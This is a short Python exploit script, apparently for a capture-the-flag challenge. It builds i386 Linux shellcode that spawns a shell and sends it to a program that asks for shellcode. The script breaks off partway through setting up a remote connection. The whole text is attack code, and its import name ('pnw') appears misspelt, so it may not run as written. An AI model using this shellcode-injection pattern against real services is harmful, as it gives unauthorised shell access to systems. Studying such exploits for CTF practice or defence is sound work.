from pnw import *

def exploit(p):
    sc = asm(shellcode.sh())
    p.sendlineafter("Enter your shellcode:",sc)

def main():
    context(arch="i386", os="linux")

    if args["REMOTE"]:
        p = remote(
